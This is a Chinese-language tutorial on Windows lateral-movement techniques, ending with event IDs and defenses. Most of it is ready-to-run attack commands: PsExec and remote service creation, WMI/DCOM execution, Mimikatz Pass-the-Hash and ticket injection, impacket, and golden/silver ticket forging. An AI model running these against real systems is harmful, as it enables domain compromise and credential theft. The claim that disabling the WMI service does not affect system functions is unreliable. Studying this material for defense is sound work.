# 横向移动

## 概述

横向移动（Lateral Movement）是内网渗透的关键阶段。攻击者在获得初始立足点后，通过内网协议和系统功能在主机间跳转，逐步扩大控制范围。常见的横向移动技术包括PsExec、WMI/WinRM、DCOM、Pass-the-Hash和Pass-the-Ticket等。

## PsExec横向移动

### 工作原理

PsExec通过服务管理远程执行命令：将可执行文件写入目标主机的ADMIN$共享，然后通过Windows服务控制管理器（SCM）创建并启动服务。该技术需要管理员权限和SMB（445端口）访问。

### 使用方式

```bash
# PsExec基础使用
psexec \\\\target -u domain\\user -p password cmd.exe

# 使用本地管理员
psexec \\\\192.168.1.100 -u Administrator -p P@ssw0rd cmd.exe

# 不使用交互式Shell
psexec \\\\target -u user -p pass -s cmd.exe /c "whoami > c:\\output.txt"

# 从Cobalt Strike执行
jump psexec target.local smb
```

### 手动PsExec：服务创建

```cmd
# 远程创建服务（手动模拟PsExec）
sc \\\\target create MyService binpath= "cmd.exe /c calc.exe"
sc \\\\target start MyService
sc \\\\target delete MyService

# 使用PowerShell
Invoke-Command -ComputerName target -ScriptBlock { whoami }

# 通过SMB复制文件
copy evil.exe \\\\target\\C$\\Windows\\Temp\\evil.exe
```

## WMI/WinRM横向移动

### WMI操作

WMI（Windows Management Instrumentation）通过RPC（135端口）进行远程管理，无需额外的服务端软件：

```cmd
# 通过WMI远程执行命令
wmic /node:192.168.1.100 /user:admin /password:pass process call create "cmd.exe /c calc.exe"

# PowerShell WMI
Invoke-WmiMethod -ComputerName target -Class Win32_Process -Name Create -ArgumentList "cmd.exe"

# 更隐蔽：通过WMI创建计划任务
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-enc BASE64_PAYLOAD"
$Task = New-ScheduledTask -Action $Action
Register-ScheduledTask -ComputerName target -TaskName "UpdateTask" -InputObject $Task
Start-ScheduledTask -ComputerName target -TaskName "UpdateTask"
```

### WinRM操作

WinRM（Windows Remote Management）通过HTTP/HTTPS（5985/5986端口）进行远程管理：

```cmd
# 启用WinRM（目标主机）
winrm quickconfig

# 远程执行命令
winrs -r:http://target:5985 -u:admin -p:pass cmd

# PowerShell远程会话
$Session = New-PSSession -ComputerName target -Credential $cred
Invoke-Command -Session $Session -ScriptBlock { whoami }
```

## DCOM横向移动

DCOM（Distributed Component Object Model）利用COM对象进行远程操作：

```powershell
# 通过MMC Application Class执行命令
$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39', "target")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Document.ActiveView.GetSelectedItems()
$item.Execute("cmd.exe /c calc.exe")

# ShellWindows DCOM
$com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880', "target")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute("cmd.exe")

# Excel DCOM（如果目标安装了Excel）
$com = New-Object -ComObject Excel.Application -Property @{Visible=$false}
$com.DisplayAlerts = $false
$com.Workbooks.Add()
$com.Run("calc.exe")
```

## Pass-the-Hash（PTH）

Pass-the-Hash允许攻击者使用密码的NTLM哈希（而非明文密码）进行网络认证。这意味着即使不知道密码原文，也能横向移动。

### Mimikatz PTH

```cmd
# 使用Mimikatz进行PTH
mimikatz.exe "sekurlsa::pth /user:admin /domain:target.local /ntlm:NTML_HASH" exit

# 成功后弹出cmd.exe，即可使用指定用户的Token访问远程资源
dir \\\\target\\C$

# 在内存中注入Hash
mimikatz.exe "sekurlsa::pth /user:admin /domain:target.local /ntlm:NTML_HASH /run:powershell.exe"
```

### 常用场景

```cmd
# 使用PTH访问目标
net use \\\\target\\admin$ /user:DOMAIN\\admin HASH
# 注意：NTLM认证不接受明文的Hash密码，需使用mimikatz注入

# impacket工具包PTH
impacket-wmiexec -hashes LMHASH:NTHASH domain/admin@target
impacket-psexec -hashes LMHASH:NTHASH domain/admin@target
impacket-smbexec -hashes LMHASH:NTHASH domain/admin@target
```

## Pass-the-Ticket（PTT）

Pass-the-Ticket攻击使用Kerberos票据（TGT或服务票据）进行身份认证。

### Mimikatz PTT

```cmd
# 导出所有Kerberos票据
mimikatz.exe "sekurlsa::tickets /export" exit

# 注入票据到当前会话
mimikatz.exe "kerberos::ptt c:\\tickets\\[0;xxxxx]-2-0-40e10000-admin@krbtgt-DOMAIN.LOCAL.kirbi" exit

# 使用Rubeus导入票据
Rubeus.exe ptt /ticket:base64_encoded_ticket
```

### 黄金票据 vs 白银票据

| 特性 | 黄金票据（Golden Ticket） | 白银票据（Silver Ticket） |
|------|--------------------------|-------------------------|
| 攻击目标 | KRBTGT账户Hash | 服务账户Hash |
| 权限 | 域内任意资源 | 特定服务 |
| 检测难度 | 低（异常TGT） | 高（不接触DC） |
| 过期 | 默认10年 | 取决于服务Ticket有效时间 |
| 需要 | KRBTGT Hash + 域SID | 服务NTLM Hash + 域SID |

```cmd
# 创建黄金票据
mimikatz.exe "kerberos::golden /domain:target.local /sid:S-1-5-21-xxx /krbtgt:KRBTGT_HASH /user:Administrator /id:500 /ptt" exit

# 创建白银票据（访问特定服务）
mimikatz.exe "kerberos::golden /domain:target.local /sid:S-1-5-21-xxx /target:target.target.local /service:cifs /rc4:SERVICE_HASH /user:Administrator /ptt" exit
```

## 检测与防御

### 关键日志事件

| 活动 | 事件ID | 描述 |
|------|--------|------|
| 远程登录 | 4624 | 登录类型3（网络）或10（远程交互） |
| 服务创建 | 4697 | 新服务安装 |
| 进程创建 | 4688 | 远程执行的进程 |
| 计划任务 | 4698 | 远程创建的计划任务 |
| 文件共享 | 5140 | 访问Admin$/C$共享 |
| WinRM连接 | 53504 | WinRM认证 |

### 防御措施

```cmd
# 启用高级审计策略
auditpol /set /subcategory:"Detailed File Share" /success:enable /failure:enable
auditpol /set /subcategory:"Process Creation" /success:enable
auditpol /set /subcategory:"Security Group Management" /success:enable

# 禁用不必要的协议
# 禁用WMI（不影响系统功能的服务）
Set-Service -Name Winmgmt -StartupType Disabled

# 启用Credential Guard（防止Hash提取）
# 通过组策略：计算机配置 > 管理模板 > 系统 > Device Guard

# LAPS（Local Administrator Password Solution）
# 每台机器使用独立本地管理员密码，定期轮换
```

### 防御清单

- **最小化管理员数量**：域管理员数量控制
- **LAPS部署**：本地管理员密码随机化管理
- **Credential Guard**：保护LSASS凭据
- **网络分段**：隔离重要网络段
- **Just Enough Admin (JEA)**：最小权限远程管理
- **Windows Defender Firewall**：限制135/445/5985/5986端口的源IP
- **RDP限制**：仅允许受控跳板机发起RDP连接
- **日志集中管理**：部署SIEM/SOC监控异常横向移动
